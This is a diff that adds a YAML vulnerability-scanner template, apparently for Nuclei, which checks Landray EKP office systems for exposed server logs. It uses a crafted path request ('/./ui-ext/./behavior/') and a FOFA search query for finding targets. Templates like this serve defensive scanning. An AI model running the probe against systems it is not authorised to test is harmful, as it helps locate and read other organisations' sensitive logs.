@@ -1,0 +1,26 @@
+id: landray-ekp-behavior-disclosure
+
+info:
+  name: 蓝凌 EKP behavior - disclosure
+  author: leadlife
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: body="Com_Parameter"
+  tags: landray,disclosure,oa
+  
+http:
+  - raw:
+      - |
+        GET /./ui-ext/./behavior/ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'ekp_server.log')
+        condition: and
